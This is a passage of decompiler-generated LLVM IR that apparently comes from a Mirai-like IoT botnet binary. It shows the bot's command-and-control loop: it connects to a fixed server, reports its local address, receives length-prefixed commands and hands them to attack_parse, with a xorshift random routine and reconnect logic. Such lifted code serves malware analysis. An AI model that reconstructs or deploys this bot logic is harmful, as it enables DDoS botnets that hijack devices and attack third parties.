  br label %dec_label_pc_d9f4

dec_label_pc_d9f4:                                ; preds = %dec_label_pc_ddf4, %dec_label_pc_de28, %bb45, %dec_label_pc_dc90, %dec_label_pc_dbd4, %dec_label_pc_dbc4, %bb42, %dec_label_pc_deb0, %dec_label_pc_de94, %dec_label_pc_de7c, %dec_label_pc_de04, %dec_label_pc_dd9c, %dec_label_pc_dce8, %dec_label_pc_db78, %dec_label_pc_d9b0
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da00

dec_label_pc_da00:                                ; preds = %dec_label_pc_da00, %dec_label_pc_d9f4
  %v1_da04 = phi i32 [ %v1_da08, %dec_label_pc_da00 ], [ 4, %dec_label_pc_d9f4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_da04 = load i32, i32* @r6, align 4
  %v3_da04 = add i32 %v2_da04, %v1_da04
  %v4_da04 = inttoptr i32 %v3_da04 to i32*
  store i32 0, i32* %v4_da04, align 4
  %v0_da08 = load i32, i32* %r3.global-to-local, align 4
  %v1_da08 = add i32 %v0_da08, 4
  store i32 %v1_da08, i32* %r3.global-to-local, align 4
  %v7_da0c = icmp eq i32 %v1_da08, 128
  br i1 %v7_da0c, label %dec_label_pc_da14, label %dec_label_pc_da00

dec_label_pc_da14:                                ; preds = %dec_label_pc_da00
  %v0_da14 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_da14, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_da1c, %dec_label_pc_da14
  %v1_da20 = phi i32 [ %v1_da24, %dec_label_pc_da1c ], [ 4, %dec_label_pc_da14 ]
  store i32 0, i32* @r4, align 4
  %v2_da20 = load i32, i32* @r7, align 4
  %v3_da20 = add i32 %v2_da20, %v1_da20
  %v4_da20 = inttoptr i32 %v3_da20 to i32*
  store i32 0, i32* %v4_da20, align 4
  %v0_da24 = load i32, i32* %r3.global-to-local, align 4
  %v1_da24 = add i32 %v0_da24, 4
  store i32 %v1_da24, i32* %r3.global-to-local, align 4
  %v7_da28 = icmp eq i32 %v1_da24, 128
  br i1 %v7_da28, label %dec_label_pc_da30, label %dec_label_pc_da1c

dec_label_pc_da30:                                ; preds = %dec_label_pc_da1c
  %v2_da30 = load i32, i32* @global_var_21740.85, align 4
  %v7_da34 = icmp eq i32 %v2_da30, -1
  br i1 %v7_da34, label %dec_label_pc_da64, label %dec_label_pc_da3c

dec_label_pc_da3c:                                ; preds = %dec_label_pc_da30
  %v3_da3c = udiv i32 %v2_da30, 32
  %v3_da44 = mul nuw nsw i32 %v3_da3c, 4
  store i32 %v2_d88c, i32* %ip.global-to-local, align 4
  %v2_da4c = add i32 %v3_da44, %v2_d88c
  store i32 %v2_da4c, i32* %r3.global-to-local, align 4
  %v1_da50 = add i32 %v2_da4c, -224
  %v2_da50 = inttoptr i32 %v1_da50 to i32*
  %v3_da50 = load i32, i32* %v2_da50, align 4
  %v1_da54 = urem i32 %v2_da30, 32
  %v7_da5c = shl i32 1, %v1_da54
  %v8_da5c = or i32 %v3_da50, %v7_da5c
  store i32 %v8_da5c, i32* %r2.global-to-local, align 4
  store i32 %v8_da5c, i32* %v2_da50, align 4
  br label %dec_label_pc_da64

dec_label_pc_da64:                                ; preds = %dec_label_pc_da30, %dec_label_pc_da3c
  %v2_da64 = load i32, i32* @global_var_21744.107, align 4
  store i32 %v2_da64, i32* @r3, align 4
  %v7_da68 = icmp eq i32 %v2_da64, -1
  store i32 ptrtoint (i32* @global_var_21744.107 to i32), i32* @r8, align 4
  br i1 %v7_da68, label %dec_label_pc_dcf4, label %dec_label_pc_da74

dec_label_pc_da74:                                ; preds = %dec_label_pc_dcf4, %dec_label_pc_da64, %bb44
  %v2_da78 = load i8, i8* bitcast (i8** @global_var_218c4.109 to i8*), align 4
  %v3_da78 = zext i8 %v2_da78 to i32
  store i32 %v3_da78, i32* %r3.global-to-local, align 4
  %v2_da7c = icmp eq i8 %v2_da78, 0
  %v2_db94 = load i32, i32* @global_var_21744.107, align 4
  store i32 %v2_db94, i32* %ip.global-to-local, align 4
  %v3_db9c = udiv i32 %v2_db94, 32
  br i1 %v2_da7c, label %dec_label_pc_db94, label %dec_label_pc_da84

dec_label_pc_da84:                                ; preds = %dec_label_pc_da74
  %v3_da94 = mul nuw nsw i32 %v3_db9c, 4
  %v2_da98 = add i32 %v3_da94, %v2_d88c
  store i32 %v2_da98, i32* %r3.global-to-local, align 4
  %v1_da9c = add i32 %v2_da98, -352
  %v2_da9c = inttoptr i32 %v1_da9c to i32*
  %v3_da9c = load i32, i32* %v2_da9c, align 4
  %v1_daa0 = urem i32 %v2_db94, 32
  %v7_daa8 = shl i32 1, %v1_daa0
  %v8_daa8 = or i32 %v3_da9c, %v7_daa8
  store i32 %v8_daa8, i32* %r2.global-to-local, align 4
  store i32 %v8_daa8, i32* %v2_da9c, align 4
  br label %dec_label_pc_dab0

dec_label_pc_dab0:                                ; preds = %dec_label_pc_db94, %dec_label_pc_da84
  %v2_dab0 = load i32, i32* @global_var_21740.85, align 4
  %v0_dab4 = load i32, i32* %ip.global-to-local, align 4
  %v5_dab8 = icmp slt i32 %v0_dab4, %v2_dab0
  br i1 %v5_dab8, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_dab0
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_dab0, %bb
  %v0_dad4 = phi i32 [ %v2_dab0, %dec_label_pc_dab0 ], [ %v0_dab4, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_dad0, i32* %ip.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad4, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d9f0, i32* %r2.global-to-local, align 4
  %v5_daec = call i32 @__libc_select(i32 %v1_dad4, i32 %v2_d9ec, i32 %v2_d9f0, i32 0, i32 %v2_dad0)
  %v8_daf0 = icmp eq i32 %v5_daec, -1
  br i1 %v8_daf0, label %dec_label_pc_d9f4, label %dec_label_pc_daf8

dec_label_pc_daf8:                                ; preds = %bb42
  %v6_daec = trunc i32 %v5_daec to i16
  %v3_daf8 = icmp eq i16 %v6_daec, 0
  br i1 %v3_daf8, label %dec_label_pc_db00, label %dec_label_pc_db2c

dec_label_pc_db00:                                ; preds = %dec_label_pc_daf8
  %v2_db04 = load i32, i32* @sb, align 4
  %v5_db08 = srem i32 %v2_db04, 6
  %v4_db10 = sub i32 %v2_db04, %v5_db08
  store i32 %v4_db10, i32* %r3.global-to-local, align 4
  store i32 %v5_db08, i32* %r2.global-to-local, align 4
  %v2_db1c = icmp eq i32 %v5_db08, 0
  %v7_db20 = inttoptr i32 %v5_daec to i8*
  store i8* %v7_db20, i8** %stack_var_-42, align 4
  %v1_db24 = add i32 %v2_db04, 1
  store i32 %v1_db24, i32* @sb, align 4
  br i1 %v2_db1c, label %dec_label_pc_ddd8, label %dec_label_pc_db2c

dec_label_pc_db2c:                                ; preds = %dec_label_pc_daf8, %dec_label_pc_db00, %dec_label_pc_ddd8
  store i32 ptrtoint (i8** @global_var_218c4.109 to i32), i32* %r2.global-to-local, align 4
  %v2_db30 = load i8, i8* bitcast (i8** @global_var_218c4.109 to i8*), align 4
  %v3_db30 = zext i8 %v2_db30 to i32
  store i32 %v3_db30, i32* @r4, align 4
  %v2_db34 = icmp eq i8 %v2_db30, 0
  %v2_dbc4 = load i32, i32* @global_var_21744.107, align 4
  br i1 %v2_db34, label %dec_label_pc_dbc4, label %dec_label_pc_db3c

dec_label_pc_db3c:                                ; preds = %dec_label_pc_db2c
  %v3_db44 = udiv i32 %v2_dbc4, 32
  store i32 %v2_d88c, i32* %ip.global-to-local, align 4
  %v3_db4c = mul nuw nsw i32 %v3_db44, 4
  %v2_db50 = add i32 %v3_db4c, %v2_d88c
  store i32 %v2_db50, i32* %r3.global-to-local, align 4
  %v1_db54 = add i32 %v2_db50, -352
  %v2_db54 = inttoptr i32 %v1_db54 to i32*
  %v3_db54 = load i32, i32* %v2_db54, align 4
  %v1_db58 = urem i32 %v2_dbc4, 32
  %v6_db5c = ashr i32 %v3_db54, %v1_db58
  store i32 %v6_db5c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_218c4.109 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_db68 = urem i32 %v6_db5c, 2
  %v2_db68 = icmp eq i32 %v1_db68, 0
  store i8 0, i8* bitcast (i8** @global_var_218c4.109 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_21744.107 to i32), i32* @r4, align 4
  br i1 %v2_db68, label %dec_label_pc_db78, label %dec_label_pc_dd64

dec_label_pc_db78:                                ; preds = %dec_label_pc_db3c
  store i32 56192, i32* @lr, align 4
  %v1_db7c = icmp ne i32 %v2_dbc4, -1
  call void @__pseudo_cond_branch(i1 %v1_db7c, i32 ptrtoint (i32* @global_var_13f30.111 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_db84 = load i32, i32* @r4, align 4
  %v2_db84 = inttoptr i32 %v1_db84 to i32*
  store i32 -1, i32* %v2_db84, align 4
  %v1_db8c = call i32 @sleep(i32 1)
  br label %dec_label_pc_d9f4

dec_label_pc_db94:                                ; preds = %dec_label_pc_da74
  store i32 %v2_d88c, i32* %r2.global-to-local, align 4
  %v3_dba4 = mul nuw nsw i32 %v3_db9c, 4
  %v2_dba8 = add i32 %v3_dba4, %v2_d88c
  store i32 %v2_dba8, i32* %r3.global-to-local, align 4
  %v1_dbac = add i32 %v2_dba8, -224
  %v2_dbac = inttoptr i32 %v1_dbac to i32*
  %v3_dbac = load i32, i32* %v2_dbac, align 4
  %v1_dbb0 = urem i32 %v2_db94, 32
  %v7_dbb8 = shl i32 1, %v1_dbb0
  %v8_dbb8 = or i32 %v3_dbac, %v7_dbb8
  store i32 %v8_dbb8, i32* %r2.global-to-local, align 4
  store i32 %v8_dbb8, i32* %v2_dbac, align 4
  br label %dec_label_pc_dab0

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_db2c
  %v7_dbc8 = icmp eq i32 %v2_dbc4, -1
  store i32 ptrtoint (i32* @global_var_21744.107 to i32), i32* @r8, align 4
  br i1 %v7_dbc8, label %dec_label_pc_d9f4, label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_dbc4
  %v3_dbd4 = udiv i32 %v2_dbc4, 32
  %v3_dbdc = mul nuw nsw i32 %v3_dbd4, 4
  store i32 %v2_d88c, i32* %ip.global-to-local, align 4
  %v2_dbe4 = add i32 %v3_dbdc, %v2_d88c
  store i32 %v2_dbe4, i32* %r3.global-to-local, align 4
  %v1_dbe8 = add i32 %v2_dbe4, -224
  %v2_dbe8 = inttoptr i32 %v1_dbe8 to i32*
  %v3_dbe8 = load i32, i32* %v2_dbe8, align 4
  %v1_dbec = urem i32 %v2_dbc4, 32
  %v6_dbf0 = ashr i32 %v3_dbe8, %v1_dbec
  store i32 %v6_dbf0, i32* %r2.global-to-local, align 4
  %v1_dbf4 = urem i32 %v6_dbf0, 2
  %v2_dbf4 = icmp eq i32 %v1_dbf4, 0
  br i1 %v2_dbf4, label %dec_label_pc_d9f4, label %dec_label_pc_dbfc

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dbd4
  store i32 %v2_db18, i32* @lr, align 4
  %v6_dc00 = inttoptr i32 %v3_db30 to i8*
  store i8* %v6_dc00, i8** %stack_var_-42, align 4
  %v0_dc04 = call i32 @__GI___errno_location()
  %v0_dc08 = load i32, i32* @r4, align 4
  %v2_dc08 = inttoptr i32 %v0_dc04 to i32*
  store i32 %v0_dc08, i32* %v2_dc08, align 4
  store i32 %v0_dc04, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dc1c = load i32, i32* @global_var_21744.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dc28 = call i32 @__libc_recv(i32 %v2_dc1c, i32 %v2_dde0, i32 2, i32 16386)
  %v7_dc2c = icmp eq i32 %v4_dc28, -1
  br i1 %v7_dc2c, label %dec_label_pc_ddf4, label %dec_label_pc_dc34

dec_label_pc_dc34:                                ; preds = %dec_label_pc_dbfc
  %v2_dc34 = icmp eq i32 %v4_dc28, 0
  br i1 %v2_dc34, label %dec_label_pc_de04, label %dec_label_pc_dc3c

dec_label_pc_dc3c:                                ; preds = %dec_label_pc_dc34
  store i32 %v2_db18, i32* @r1, align 4
  %v3_dc40 = load i8*, i8** %stack_var_-42, align 4
  %v4_dc40 = ptrtoint i8* %v3_dc40 to i32
  store i32 %v4_dc40, i32* %r3.global-to-local, align 4
  %v2_dc44 = icmp eq i8* %v3_dc40, null
  br i1 %v2_dc44, label %dec_label_pc_de94, label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc3c
  %v3_dc4c = udiv i32 %v4_dc40, 256
  %v1_dc50 = mul i32 %v4_dc40, 256
  %v4_dc54 = and i32 %v1_dc50, 65280
  %v5_dc54 = or i32 %v4_dc54, %v3_dc4c
  %v6_dc54 = trunc i32 %v5_dc54 to i16
  store i32 %v5_dc54, i32* %r2.global-to-local, align 4
  store i32 %v2_db18, i32* %r3.global-to-local, align 4
  %v7_dc60 = inttoptr i32 %v5_dc54 to i8*
  store i8* %v7_dc60, i8** %stack_var_-42, align 4
  %tmp46 = icmp ugt i16 %v6_dc54, 1024
  br i1 %tmp46, label %dec_label_pc_deb0, label %dec_label_pc_dc68

dec_label_pc_dc68:                                ; preds = %dec_label_pc_dc4c
  %v0_dc68 = load i32, i32* @r4, align 4
  %v1_dc68 = load i32, i32* @r5, align 4
  %v2_dc68 = inttoptr i32 %v1_dc68 to i32*
  store i32 %v0_dc68, i32* %v2_dc68, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dc74 = load i32, i32* @global_var_21744.107, align 4
  %v7_dc7c = call i32 @__libc_recv(i32 %v2_dc74, i32 %v2_dc78, i32 %v5_dc54, i32 16386)
  %v7_dc80 = icmp eq i32 %v7_dc7c, -1
  br i1 %v7_dc80, label %dec_label_pc_ddf4, label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %dec_label_pc_dc68
  %v2_dc88 = icmp eq i32 %v7_dc7c, 0
  br i1 %v2_dc88, label %dec_label_pc_de04, label %dec_label_pc_dc90

dec_label_pc_dc90:                                ; preds = %dec_label_pc_dc88
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_dca0 = load i32, i32* @global_var_21744.107, align 4
  %v4_dca4 = call i32 @__libc_recv(i32 %v2_dca0, i32 %v2_dde0, i32 2, i32 16384)
  %v3_dcac = load i8*, i8** %stack_var_-42, align 4
  %v4_dcac = ptrtoint i8* %v3_dcac to i32
  %v3_dcb0 = udiv i32 %v4_dcac, 256
  %v1_dcb4 = mul i32 %v4_dcac, 256
  %v4_dcb8 = and i32 %v1_dcb4, 65280
  %v5_dcb8 = or i32 %v4_dcb8, %v3_dcb0
  store i32 %v5_dcb8, i32* %ip.global-to-local, align 4
  store i32 %v2_db18, i32* @lr, align 4
  store i32 %v5_dcb8, i32* %r2.global-to-local, align 4
  %v2_dcc8 = load i32, i32* @global_var_21744.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dcd0 = inttoptr i32 %v5_dcb8 to i8*
  store i8* %v6_dcd0, i8** %stack_var_-42, align 4
  %v6_dcd4 = call i32 @__libc_recv(i32 %v2_dcc8, i32 %v2_dc78, i32 %v5_dcb8, i32 16384)
  store i32 %v2_db18, i32* %r2.global-to-local, align 4
  %v3_dcdc = load i8*, i8** %stack_var_-42, align 4
  %v3_dce0 = icmp eq i8* %v3_dcdc, null
  br i1 %v3_dce0, label %dec_label_pc_d9f4, label %dec_label_pc_dce8

dec_label_pc_dce8:                                ; preds = %dec_label_pc_dc90
  %v4_dcdc = ptrtoint i8* %v3_dcdc to i32
  %v5_dcec = call i32 @attack_parse(i32* nonnull %stack_var_-1416, i32 %v4_dcdc, i32 %v2_db18)
  br label %dec_label_pc_d9f4

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_da64
  %v0_dcfc = load i32, i32* @r4, align 4
  store i32 %v0_dcfc, i32* %r2.global-to-local, align 4
  %v3_dd00 = call i32 @socket(i32 2, i32 1, i32 %v0_dcfc)
  %v7_dd04 = icmp eq i32 %v3_dd00, -1
  store i32 %v3_dd00, i32* @r5, align 4
  %v1_dd0c = load i32, i32* @r8, align 4
  %v2_dd0c = inttoptr i32 %v1_dd0c to i32*
  store i32 %v3_dd00, i32* %v2_dd0c, align 4
  br i1 %v7_dd04, label %dec_label_pc_da74, label %dec_label_pc_dd14

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dcf4
  %v0_dd14 = load i32, i32* @r4, align 4
  store i32 %v0_dd14, i32* @r2, align 4
  %v2_dd1c = call i32 @__libc_fcntl(i32 %v3_dd00, i32 3)
  %v1_dd24 = or i32 %v2_dd1c, 2048
  store i32 %v1_dd24, i32* @r2, align 4
  %v0_dd28 = load i32, i32* @r5, align 4
  %v2_dd2c = call i32 @__libc_fcntl(i32 %v0_dd28, i32 4)
  %v2_dd34 = load i32, i32* @global_var_21748.83, align 4
  store i32 %v2_dd34, i32* %r3.global-to-local, align 4
  %v2_dd38 = icmp eq i32 %v2_dd34, 0
  br i1 %v2_dd38, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_dd14
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_dd14, %bb43
  %v2_dd40 = xor i1 %v2_dd38, true
  call void @__pseudo_cond_branch(i1 %v2_dd40, i32 ptrtoint (i32* @global_var_103a0.112 to i32))
  store i32 ptrtoint (i8** @global_var_218c4.109 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_dd4c = load i32, i32* @global_var_21744.107, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_218c4.109 to i8*), align 4
  %v4_dd5c = call i32 @__libc_connect(i32 %v2_dd4c, i32 ptrtoint (i16** @global_var_243e0.92 to i32), i32 16)
  br label %dec_label_pc_da74

dec_label_pc_dd64:                                ; preds = %dec_label_pc_db3c
  store i32 4, i32* @r5, align 4
  store i32 %v2_dd70, i32* %r3.global-to-local, align 4
  store i32 %v2_dd74, i32* @lr, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_dd8c = call i32 @getsockopt(i32 %v2_dbc4, i32 1, i32 4, i32 %v2_dd70, i32 %v2_dd74)
  %v3_dd90 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_dd90, i32* %r3.global-to-local, align 4
  %v2_dd94 = icmp eq i32 %v3_dd90, 0
  br i1 %v2_dd94, label %dec_label_pc_de28, label %dec_label_pc_dd9c

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dd64
  %v2_dd9c = load i32, i32* @global_var_21744.107, align 4
  %v1_dda0 = call i32 @__GI___libc_close(i32 %v2_dd9c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dda8 = load i32, i32* @r4, align 4
  %v2_dda8 = inttoptr i32 %v1_dda8 to i32*
  store i32 -1, i32* %v2_dda8, align 4
  %v0_ddac = call i32 @rand_next()
  %v3_ddb4 = zext i32 %v0_ddac to i64
  %v4_ddb4 = mul nuw i64 %v3_ddb4, 3435973837
  %v3_ddb82 = udiv i64 %v4_ddb4, 34359738368
  %v3_ddbc4 = mul nuw nsw i64 %v3_ddb82, 8
  %v3_ddbc = trunc i64 %v3_ddbc4 to i32
  store i32 %v3_ddbc, i32* %r2.global-to-local, align 4
  %v2_ddc06 = mul nuw nsw i64 %v3_ddb82, 2
  %v2_ddc0 = trunc i64 %v2_ddc06 to i32
  %v2_ddc4 = add i32 %v3_ddbc, %v2_ddc0
  store i32 %v2_ddc4, i32* %r3.global-to-local, align 4
  %v2_ddc8 = sub i32 %v0_ddac, %v2_ddc4
  %v1_ddcc = add i32 %v2_ddc8, 1
  %v1_ddd0 = call i32 @sleep(i32 %v1_ddcc)
  br label %dec_label_pc_d9f4

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_db00
  %v2_dddc = load i32, i32* @global_var_21744.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ddec = call i32 @__libc_send(i32 %v2_dddc, i32 %v2_dde0, i32 2, i32 16384)
  br label %dec_label_pc_db2c

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_dc68, %dec_label_pc_dbfc
  %v0_ddf4 = load i32, i32* @r5, align 4
  %v1_ddf4 = inttoptr i32 %v0_ddf4 to i32*
  %v2_ddf4 = load i32, i32* %v1_ddf4, align 4
  store i32 %v2_ddf4, i32* %r3.global-to-local, align 4
  %v7_ddf8 = icmp eq i32 %v2_ddf4, 4
  br i1 %v7_ddf8, label %dec_label_pc_d9f4, label %bb45

bb45:                                             ; preds = %dec_label_pc_ddf4
  %v8_ddfc = icmp eq i32 %v2_ddf4, 11
  br i1 %v8_ddfc, label %dec_label_pc_d9f4, label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %bb45, %dec_label_pc_dc88, %dec_label_pc_dc34
  %v2_de04 = load i32, i32* @global_var_21744.107, align 4
  store i32 56848, i32* @lr, align 4
  %v1_de0c = icmp ne i32 %v2_de04, -1
  call void @__pseudo_cond_branch(i1 %v1_de0c, i32 ptrtoint (i32* @global_var_13f30.111 to i32))
  store i32 ptrtoint (i32* @global_var_21744.107 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_21744.107, align 4
  %v1_de20 = call i32 @sleep(i32 1)
  br label %dec_label_pc_d9f4

dec_label_pc_de28:                                ; preds = %dec_label_pc_dd64
  %v2_de30 = call i32 @util_strlen(i8* %v1_de30)
  %sext = mul i32 %v2_de30, 16777216
  %v1_de34 = sdiv i32 %sext, 16777216
  %v7_de34 = inttoptr i32 %v1_de34 to i8*
  store i8* %v7_de34, i8** %stack_var_-42, align 4
  %v0_de38 = call i32 @util_local_addr()
  store i32 %v0_de38, i32* @global_var_243d4.57, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_de4c = load i32, i32* @r5, align 4
  store i32 %v0_de4c, i32* %r2.global-to-local, align 4
  %v2_de50 = load i32, i32* @global_var_21744.107, align 4
  %v4_de54 = call i32 @__libc_send(i32 %v2_de50, i32 ptrtoint (i32* @global_var_18f60.115 to i32), i32 %v0_de4c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_de60 = load i32, i32* @global_var_21744.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_de6c = call i32 @__libc_send(i32 %v2_de60, i32 %v2_dde0, i32 1, i32 16384)
  %v3_de70 = load i8*, i8** %stack_var_-42, align 4
  %v4_de70 = ptrtoint i8* %v3_de70 to i32
  store i32 %v4_de70, i32* %r2.global-to-local, align 4
  %v3_de74 = icmp eq i8* %v3_de70, null
  br i1 %v3_de74, label %dec_label_pc_d9f4, label %dec_label_pc_de7c

dec_label_pc_de7c:                                ; preds = %dec_label_pc_de28
  %v2_de80 = load i32, i32* @global_var_21744.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_de8c = call i32 @__libc_send(i32 %v2_de80, i32 %v2_d830, i32 %v4_de70, i32 16384)
  br label %dec_label_pc_d9f4

dec_label_pc_de94:                                ; preds = %dec_label_pc_dc3c
  %v2_de98 = load i32, i32* @global_var_21744.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_dea4 = add i32 %v4_dc40, 16384
  store i32 %v1_dea4, i32* %r3.global-to-local, align 4
  %v4_dea8 = call i32 @__libc_recv(i32 %v2_de98, i32 %v2_dde0, i32 2, i32 %v1_dea4)
  br label %dec_label_pc_d9f4

dec_label_pc_deb0:                                ; preds = %dec_label_pc_dc4c
  %v2_deb0 = load i32, i32* @global_var_21744.107, align 4
  %v1_deb4 = call i32 @__GI___libc_close(i32 %v2_deb0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_debc = load i32, i32* @r8, align 4
  %v2_debc = inttoptr i32 %v1_debc to i32*
  store i32 -1, i32* %v2_debc, align 4
  br label %dec_label_pc_d9f4

; uselistorder directives
  uselistorder i32 %v3_dd00, { 1, 3, 2, 0 }
  uselistorder i8* %v3_dcdc, { 1, 0 }
  uselistorder i32 %v5_dcb8, { 1, 0, 2, 3 }
  uselistorder i32 %v7_dc7c, { 1, 0 }
  uselistorder i32 %v5_dc54, { 1, 0, 3, 2 }
  uselistorder i32 %v4_dc40, { 2, 0, 1, 3 }
  uselistorder i32 %v4_dc28, { 1, 0 }
  uselistorder i32 %v2_dbc4, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_db08, { 1, 0, 2 }
  uselistorder i32 %v2_db04, { 2, 0, 1 }
  uselistorder i32 %v5_daec, { 1, 2, 0 }
  uselistorder i32 %v2_da30, { 2, 1, 0 }
  uselistorder i32 %v1_da24, { 1, 2, 0 }
  uselistorder i32 %v1_da08, { 1, 2, 0 }
  uselistorder i32 %v2_dde0, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_db18, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_d9f0, { 1, 0, 2 }
  uselistorder i32 %v2_d88c, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_d874, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 9 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_218c4.109 to i32), { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_218c4.109 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_21744.107, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* @global_var_21740.85, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_21748.83, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d658.81 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_243e0.92 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_db2c, { 2, 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_da74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_da64, { 1, 0 }
  uselistorder label %dec_label_pc_d9f4, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d844, { 2, 0, 1 }
}

define i32 @function_deec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_deec:
  %v0_deec = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_deec, i32 -22312544)
  %v0_def4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_def4, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_deec
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_deec, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_df04 = load i32, i32* @global_var_218c8.117, align 4
  %v2_df08 = load i32, i32* @global_var_218d4.119, align 4
  %v4_df14 = mul i32 %v2_df04, 2048
  %v5_df14 = xor i32 %v4_df14, %v2_df04
  store i32 %v5_df14, i32* @r3, align 4
  %v4_df18 = udiv i32 %v2_df08, 524288
  %v5_df18 = xor i32 %v4_df18, %v2_df08
  %v2_df1c = load i32, i32* @global_var_218cc.121, align 4
  %v2_df20 = load i32, i32* @global_var_218d0.123, align 4
  %v2_df24 = xor i32 %v5_df18, %v5_df14
  %v4_df28 = udiv i32 %v5_df14, 256
  %v5_df28 = xor i32 %v2_df24, %v4_df28
  store i32 %v2_df1c, i32* @global_var_218c8.117, align 4
  store i32 %v2_df20, i32* @global_var_218cc.121, align 4
  store i32 %v2_df08, i32* @global_var_218d0.123, align 4
  store i32 %v5_df28, i32* @global_var_218d4.119, align 4
  ret i32 %v5_df28

; uselistorder directives
  uselistorder i32 %v2_df08, { 2, 1, 0 }
  uselistorder i32 %v2_df04, { 1, 0 }
}

